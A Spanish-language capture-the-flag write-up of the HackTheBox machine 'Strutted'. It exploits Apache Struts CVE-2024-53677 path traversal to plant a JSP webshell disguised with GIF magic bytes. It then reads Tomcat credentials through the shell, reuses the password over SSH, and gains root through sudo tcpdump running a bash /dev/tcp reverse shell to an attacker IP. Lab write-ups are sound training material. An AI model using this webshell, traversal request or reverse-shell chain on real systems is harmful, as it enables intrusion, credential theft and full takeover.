# Writeup Completo - Máquina Strutted (HackTheBox)

---

## Reconocimiento

### Escaneo de Puertos

Iniciamos con un escaneo de puertos usando `nmap`:

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.30 -oG allPorts
```

**Puertos detectados:**

- **Puerto 22 (SSH):** OpenSSH
- **Puerto 80 (HTTP):** Servidor web

### Análisis de la Aplicación Web

Al acceder a `http://strutted.htb`, encontramos una aplicación web que permite:

1. **Subir archivos** (con restricciones de tipo: JPG, JPEG, GIF)
2. **Descargar el código fuente** de la aplicación

#### Análisis del Código Fuente

Al descargar y examinar el código fuente, encontramos el archivo `pom.xml` que revela información crítica:

```xml
<dependency>
    <groupId>org.apache.struts</groupId>
    <artifactId>struts2-core</artifactId>
    <version>6.3.0.1</version>
</dependency>
```

**Hallazgo crítico:**

- **Framework:** Apache Struts 6.3.0.1
- **Servidor:** Tomcat 9
- **Vulnerabilidad:** CVE-2024-53677 (Path Traversal)

---

## Análisis de Vulnerabilidades

### CVE-2024-53677: Path Traversal en Apache Struts

#### ¿Qué es esta vulnerabilidad?

Apache Struts 6.3.0.1 contiene una vulnerabilidad de **Path Traversal** que permite a un atacante controlar la ubicación donde se guardan los archivos subidos mediante la manipulación del parámetro `uploadFileName`.

#### Componentes Técnicos de la Vulnerabilidad

##### 1. Sistema de File Upload de Struts

Struts maneja automáticamente los uploads mediante su **FileUploadInterceptor**. Para cada archivo subido, Struts crea tres propiedades:

```java
public class UploadAction extends ActionSupport {
    private File Upload;              // Archivo temporal
    private String uploadFileName;     // Nombre del archivo (VULNERABLE)
    private String uploadContentType;  // Tipo MIME
}
```

##### 2. El Parámetro `top.uploadFileName`

Struts usa **OGNL (Object-Graph Navigation Language)** para acceder a propiedades:

- `top`: El objeto Action actual (contexto raíz)
- `uploadFileName`: Propiedad que contiene el nombre del archivo

**La vulnerabilidad:** Struts NO valida ni sanitiza `uploadFileName`, permitiendo secuencias como `../../`

**Construcción de la ruta:**

```
Ruta destino = UPLOAD_DIR + uploadFileName

Si uploadFileName = "../../webapps/shell.jsp"
Ruta final = /var/lib/tomcat9/uploads/TIMESTAMP/../../webapps/shell.jsp
           = /var/lib/tomcat9/webapps/shell.jsp  (¡en el webroot!)
```

---

## Explotación - CVE-2024-53677

### Fase 1: Bypass de Restricciones de Tipo de Archivo

La aplicación solo acepta archivos JPG, JPEG y GIF. Para bypassear esta restricción:

#### Técnica: Magic Bytes + Extension Spoofing

**Magic Bytes de GIF:**

```
GIF89a;
```

Los primeros bytes de un archivo determinan su tipo. Al agregar `GIF89a;` al inicio, engañamos al validador del servidor para que detecte un archivo GIF legítimo.

#### Payload JSP Malicioso

Después de los magic bytes, insertamos código JSP para crear una webshell:

```jsp
GIF89a;
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) {
            output += s + "\n";
         }
      }
      catch(IOException e) {
         e.printStackTrace();
      }
   }
%>
<%= output %>
```

**¿Por qué funciona?**

Aunque el archivo comienza con bytes de GIF, cuando Tomcat procesa un archivo `.jsp`:

1. Ejecuta todo el código Java dentro de `<% %>`
2. Los bytes `GIF89a;` son ignorados por el intérprete JSP
3. La webshell se activa al acceder con `?cmd=comando`

### Fase 2: Explotación del Path Traversal

#### Petición HTTP Maliciosa


![[Pasted image 20260108144627.png]]

#### Elementos Críticos de la Petición

1. **`name="Upload"`**  
    
    - El parámetro debe llamarse `Upload` porque el Action define el campo del upload con esa capitalización. Struts usa el nombre del input como base para asociar el `File`, y si no coincide, el FileUploadInterceptor no enlaza el archivo al Action
    
2. **`filename="shell.gif"`**
    
    - Pasa la validación de tipo de archivo
    - El servidor detecta los magic bytes GIF
3. **`Content-Type: image/gif`**
    
    - Confirma al servidor que es una imagen
    - Validación de MIME type satisfecha
4. **`name="top.uploadFileName"`**
    
    - Parámetro adicional que controla la ubicación de guardado
    - **Valor:** `../../webapps/shell.jsp`
5. **Path Traversal:** `../../webapps/shell.jsp`
    
    - Escapa del directorio `uploads/`
    - Coloca el archivo en el webroot como `.jsp`
    - Tomcat ejecutará el código JSP



# Response 


![[Pasted image 20260108144744.png]]
#### Diagrama del Flujo de Ataque

```
┌────────────────────────────────────────────────────────┐
│ Atacante envía petición maliciosa                      │
│ ┌─────────────────────────────────────────────────┐    │
│ │ name="Upload" (MAYÚSCULA)                       │    │
│ │ filename="shell.gif"                            │    │
│ │ Content-Type: image/gif                         │    │
│ │ Payload: GIF89a; + código JSP                   │    │
│ │ top.uploadFileName: ../../webapps/shell.jsp     │    │
│ └─────────────────────────────────────────────────┘    │
└──────────────────┬─────────────────────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────────────────────┐
│ Apache Struts procesa la petición                      │
│ ┌─────────────────────────────────────────────────┐    │
│ │ 1. Detecta propiedad "Upload"                   │    │
│ │ 2. Valida magic bytes: GIF89a detectado         │    │
│ │ 3. Lee uploadFileName: ../../webapps/shell.jsp  │    │
│ │ 4. NO valida path traversal                     │    │
│ └─────────────────────────────────────────────────┘    │
└──────────────────┬─────────────────────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────────────────────┐
│ Sistema resuelve ruta                                  │
│ ┌─────────────────────────────────────────────────┐    │
│ │ /uploads/20260108/../../../webapps/shell.jsp    │    │
│ │ = /var/lib/tomcat9/webapps/shell.jsp            │    │
│ └─────────────────────────────────────────────────┘    │
└──────────────────┬─────────────────────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────────────────────┐
│ Archivo guardado en webroot                            │
│ ┌─────────────────────────────────────────────────┐    │
│ │ Ubicación: /webapps/shell.jsp                   │    │
│ │ Extensión: .jsp → Tomcat ejecutará el código    │    │
│ │ Accesible vía: http://strutted.htb/shell.jsp    │    │
│ └─────────────────────────────────────────────────┘    │
└──────────────────┬─────────────────────────────────────┘
                   │
                   ▼
┌────────────────────────────────────────────────────────┐
│  RCE (Remote Code Execution) conseguido              │
│                                                        │
│ http://strutted.htb/shell.jsp?cmd=whoami              │
│ Output: tomcat                                         │
└────────────────────────────────────────────────────────┘
```

### Fase 3: Verificación de la Webshell

Una vez subido el archivo, verificamos el acceso:

```bash
# Comando básico
curl "http://strutted.htb/shell.jsp?cmd=whoami"
# Output: tomcat

# Identificación del usuario
curl "http://strutted.htb/shell.jsp?cmd=id"
# Output: uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)

# Directorio actual
curl "http://strutted.htb/shell.jsp?cmd=pwd"
# Output: /var/lib/tomcat9
```

![[Pasted image 20260108144138.png]]

---

## Post-Explotación y Acceso SSH

### Enumeración del Sistema

#### Exploración del Sistema de Archivos

```bash
# Listar directorio actual
http://strutted.htb/shell.jsp?cmd=ls%20-la

# Output:
# drwxr-xr-x 7 root   root   4096 Jul 20  2022 .
# drwxr-xr-x 38 root  root   4096 Jul 20  2022 ..
# lrwxrwxrwx 1 root   root     12 Jul 20  2022 conf -> /etc/tomcat9
# drwxr-xr-x 2 tomcat tomcat 4096 Jul 20  2022 lib
# drwxr-xr-x 2 tomcat tomcat 4096 Jan  8 01:31 logs
# drwxr-xr-x 3 root   root   4096 Jul 20  2022 policy
# drwxr-xr-x 4 tomcat tomcat 4096 Jan  8 01:39 webapps
# drwxr-xr-x 3 tomcat tomcat 4096 Jan  8 01:31 work
```

**🔍 Hallazgo crítico:** El directorio `conf` es un **symlink** que apunta a `/etc/tomcat9`

```bash
conf -> /etc/tomcat9
```

#### Búsqueda de Archivos de Configuración Sensibles

```bash
# Listar contenido de /etc/tomcat9
http://strutted.htb/shell.jsp?cmd=ls%20-la%20/etc/tomcat9

# Output:
# -rw-r----- 1 root tomcat 2902 Jan 11 2025 tomcat-users.xml
# -rw-r--r-- 1 root root   7883 Jan 20 2025 server.xml
# -rw-r--r-- 1 root root   2633 Jan 20 2025 web.xml
```

**Análisis de permisos de `tomcat-users.xml`:**

```
-rw-r----- 1 root tomcat 2902 Jan 11 2025 tomcat-users.xml
```

Desglose:

- **Owner:** root (rw- = lectura/escritura)
- **Group:** tomcat (r-- = solo lectura) 
- **Others:** sin permisos

Como nuestro usuario es `tomcat` (gid=998) y pertenecemos al grupo `tomcat`, **tenemos acceso de lectura**.

### Extracción de Credenciales

#### Problema: Comandos de Lectura Bloqueados

Al intentar leer el archivo con comandos tradicionales, no obtenemos output:

```bash
# Intentos fallidos
?cmd=cat /etc/tomcat9/tomcat-users.xml     #  Sin output
?cmd=head /etc/tomcat9/tomcat-users.xml    #  Sin output
?cmd=tail /etc/tomcat9/tomcat-users.xml    #  Sin output
?cmd=strings /etc/tomcat9/tomcat-users.xml #  Sin output
```

**Posibles causas:**

1. La webshell tiene problemas mostrando caracteres XML (`<>`)
2. Output truncado por longitud
3. Java SecurityManager bloqueando ciertos comandos
4. Caracteres especiales rompiendo el rendering HTML

#### Solución: Codificación Base64

Para evadir estas restricciones, codificamos el archivo en **Base64**:

```bash
http://strutted.htb/shell.jsp?cmd=base64%20/etc/tomcat9/tomcat-users.xml
```

**¿Por qué funciona?**

- Base64 convierte el contenido en caracteres alfanuméricos (A-Z, a-z, 0-9, +, /)
- No contiene caracteres especiales que puedan romper el HTML
- Es seguro de transmitir por HTTP

#### Extracción y Decodificación


![[Pasted image 20260108144342.png]]

1. **Copiar el output base64** desde el código fuente de la página (`Ctrl+U` o botón derecho → Ver código fuente)
    
2. **Decodificar en la máquina atacante:**
    

```bash
echo "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPC..." | base64 -d
```

#### Contenido de tomcat-users.xml

![[Pasted image 20260108145053.png]]

**🔑 Credenciales encontradas:**

| Usuario | Contraseña   | Roles                  |
| ------- | ------------ | ---------------------- |
| admin   | IT14d6SSP81k | manager-gui, admin-gui |

### Pivoting: Ataque de Reutilización de Credenciales

#### Enumeración de Usuarios del Sistema

```bash
http://strutted.htb/shell.jsp?cmd=cat%20/etc/passwd%20|%20grep%20-E%20"/bin/bash|/bin/sh"

# Output:
# root:x:0:0:root:/root:/bin/bash
# james:x:1000:1000:james:/home/james:/bin/bash
```

**Usuario identificado:** `james` (uid=1000, usuario legítimo del sistema)

#### Password Reuse Attack

Las credenciales encontradas en configuraciones web frecuentemente se reutilizan en otros servicios. Probamos contra SSH:

```bash
ssh james@strutted.htb
Password: IT14d6SSP81k
```

** Acceso conseguido!**

```bash
james@strutted:~$ whoami
james

james@strutted:~$ id
uid=1000(james) gid=1000(james) groups=1000(james)

james@strutted:~$ cat user.txt
```

---

## Escalada de Privilegios

### Enumeración de Permisos SUDO

Una vez dentro del sistema como el usuario `james`, verificamos los permisos sudo:

![[Pasted image 20260108145616.png]]

** Hallazgo crítico:**

- El usuario `james` puede ejecutar `/usr/sbin/tcpdump` como root sin contraseña
- Parámetro: `(ALL) NOPASSWD:`

### Análisis de la Vulnerabilidad de tcpdump

#### ¿Por qué tcpdump es peligroso con sudo?

`tcpdump` tiene varios parámetros que permiten ejecutar comandos externos:

- **`-z postrotate-command`**: Ejecuta un comando después de rotar archivos de captura
- **`-Z user`**: Cambia al usuario especificado después de abrir el dispositivo de captura
- **`-W filecount`**: Número máximo de archivos de captura
- **`-G rotate_seconds`**: Rota el archivo de captura cada N segundos

#### Cadena de Explotación

**Combinación peligrosa:**

```bash
sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $SCRIPT -Z root
```

Desglose de parámetros:

- `-ln`: Modo no interactivo (no resolución DNS)
- `-i lo`: Interfaz loopback (no requiere permisos especiales de red)
- `-w /dev/null`: Escribir capturas a /dev/null (descartarlas)
- **`-W 1`**: Limitar a 1 archivo (trigger para ejecutar el script)
- **`-G 1`**: Rotar cada 1 segundo (trigger inmediato)
- **`-z $SCRIPT`**: Ejecutar script después de rotar
- **`-Z root`**: Mantener privilegios de root

**Flujo de ataque:**

```
1. tcpdump inicia con permisos de root (vía sudo)
2. Captura 1 paquete en loopback (límite: -W 1)
3. Después de 1 segundo, rota el archivo (-G 1)
4. Al rotar, ejecuta el script especificado en -z
5. Script se ejecuta como root (-Z root)
6. ¡Shell de root conseguida!
```

### Explotación


![[Pasted image 20260108145938.png]]

#### Paso 1: Preparar el Script Malicioso

Creamos un script temporal que establece una reverse shell:

```bash
james@strutted:/tmp$ COMMAND='bash -c "bash -i >& /dev/tcp/10.10.17.173/4444 0>&1"'
james@strutted:/tmp$ TF=$(mktemp)
james@strutted:/tmp$ echo "$COMMAND" > $TF
james@strutted:/tmp$ chmod +x $TF
```

**Desglose:**

- `COMMAND`: Reverse shell usando bash
- `mktemp`: Crea archivo temporal (ej: `/tmp/tmp.aBcDeF123`)
- `echo "$COMMAND" > $TF`: Escribe el comando en el archivo
- `chmod +x $TF`: Da permisos de ejecución

#### Paso 2: Configurar Listener en Máquina Atacante

```bash
nc -nlvp 4444
```

#### Paso 3: Ejecutar tcpdump con Privilegios

```bash
james@strutted:/tmp$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
Maximum file limit reached: 1
1 packet captured
4 packets received by filter
0 packets dropped by kernel
```

**¿Qué sucede internamente?**

```
1. tcpdump inicia captura en interfaz loopback
2. Detecta 1 paquete → límite alcanzado (-W 1)
3. Ejecuta rotación de archivo (-G 1)
4. Llama al script: /tmp/tmp.aBcDeF123
5. Script ejecuta: bash -c "bash -i >& /dev/tcp/10.10.17.173/4444 0>&1"
6. Conexión TCP saliente hacia 10.10.17.173:4444
7. Shell interactiva de bash enviada al atacante
```

#### Paso 4: Recibir Shell de Root

![[Pasted image 20260108150206.png]]

### Diagrama de Escalada de Privilegios

```
┌──────────────────────────────────────────────────────────┐
│ Usuario: james (uid=1000)                                │
│ Verificación de permisos sudo                            │
└────────────────┬─────────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────────┐
│ sudo -l                                                  │
│ ┌──────────────────────────────────────────────────┐     │
│ │ (ALL) NOPASSWD: /usr/sbin/tcpdump                │     │
│ └──────────────────────────────────────────────────┘     │
└────────────────┬─────────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────────┐
│ Análisis de vectores de ataque                           │
│ tcpdump tiene parámetros peligrosos:                     │
│ • -z: Ejecuta comando después de rotar                   │
│ • -Z root: Mantiene privilegios de root                  │
└────────────────┬─────────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────────┐
│ Preparación del payload                                  │
│ ┌──────────────────────────────────────────────────┐     │
│ │ COMMAND='bash -c "bash -i >& /dev/tcp/..."'      │     │
│ │ TF=$(mktemp)                                     │     │
│ │ echo "$COMMAND" > $TF                            │     │
│ │ chmod +x $TF                                     │     │
│ └──────────────────────────────────────────────────┘     │
└────────────────┬─────────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────────┐
│ Listener en máquina atacante                             │
│ nc -nlvp 4444                                            │
└────────────────┬─────────────────────────────────────────┘
                 │
                 ▼
┌──────────────────────────────────────────────────────────┐
│ Ejecución del exploit                                    │
│ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 \         │
│              -z $TF -Z root                              │
│                                                          │
│ ┌──────────────────────────────────────────────────┐     │
│ │ 1. tcpdump inicia con permisos root              │     │
│ │ 2. Captura en loopback (-i lo)                   │     │
│ │ 3. Límite de 1 archivo alcanzado (-W 1)          │     │
│ │ 4. Rotación activada (-G 1)                      │     │
│ │ 5. Script ejecutado como root (-z $TF -Z root)   │     │
│ │ 6. Reverse shell establecida                     │     │
│ └──────────────────────────────────────────────────┘     │
└────────────────┬─────────────────────────────────────────┘
```